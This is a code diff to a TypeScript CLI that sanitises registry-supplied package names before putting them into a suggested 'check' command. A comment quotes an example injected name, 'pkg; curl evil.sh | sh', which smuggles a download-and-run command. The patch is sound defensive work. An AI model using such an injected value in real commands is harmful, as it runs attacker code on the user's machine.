@@ -887,7 +887,17 @@ function paintNotFoundTone(tone: NotFoundTone, s: string): string {
   return s;
 }
 
-/** Next-steps CTAs for the registry-only render path. */
+/**
+ * Next-steps CTAs for the registry-only render path.
+ *
+ * #273, second class — `registry.name` is REMOTE data. Every other site in that
+ * issue splices a path out of the local tree; this one splices a name the
+ * Registry served, into a command the reader is invited to paste. An entry
+ * called `pkg; curl evil.sh | sh` produced exactly that. `<name>` is the
+ * fallback for a name that cannot be shown truthfully, on the same reasoning as
+ * `citationTarget`'s `<dir>`: a placeholder stays a correct instruction, and a
+ * command naming bytes the reader cannot see does not.
+ */
 function buildRegistryCheckCtas(registry: RegistryTrustData): NextStepsCta[] {
   const ctas: NextStepsCta[] = [];
   const normalized = normalizeTrustVerdict(registry.verdict);
@@ -897,13 +907,13 @@ function buildRegistryCheckCtas(registry: RegistryTrustData): NextStepsCta[] {
   if (isUnscanned || registry.trustLevel <= 2 || normalized === 'blocked' || normalized === 'warning') {
     ctas.push({
       label: 'Fresh scan',
-      command: `${CLI_PREFIX} check ${registry.name}`,
+      command: `${CLI_PREFIX} check ${citationPath(registry.name) ?? '<name>'}`,
       primary: true,
     });
   } else {
     ctas.push({
       label: 'Fresh scan',
-      command: `${CLI_PREFIX} check ${registry.name}`,
+      command: `${CLI_PREFIX} check ${citationPath(registry.name) ?? '<name>'}`,
       primary: true,
     });
   }
